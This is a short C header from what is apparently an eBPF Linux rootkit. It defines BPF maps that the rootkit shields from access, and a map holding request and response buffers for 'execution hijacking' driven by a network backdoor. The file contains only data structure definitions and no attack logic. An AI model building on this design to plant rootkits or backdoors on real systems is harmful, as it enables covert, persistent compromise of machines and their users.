#ifndef __MAP_PROT_H
#define __MAP_PROT_H

#include "headervmlinux.h"

/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rootkit
//Exclusive to bpf, see /src/bpf/defs.h


/*PROTECTED MAPS*/
//Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted

//Execution hijacking, holder of requesting/response data sent from/to the network backdoor
#define EXEC_HIJACK_REQUEST_PROGRAM_MAX_LEN 256
#define EXEC_HIJACK_RESPONSE_PROGRAM_MAX_LEN 256
struct exec_hijack_data{ //Map value
	char req_buf[EXEC_HIJACK_REQUEST_PROGRAM_MAX_LEN];
    char res_buf[EXEC_HIJACK_RESPONSE_PROGRAM_MAX_LEN];
};

struct exec_prot_hijack{ //Map
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32); //just 1 entry allowed
	__type(value, struct exec_hijack_data);
} exec_hijack SEC(".maps");

#endif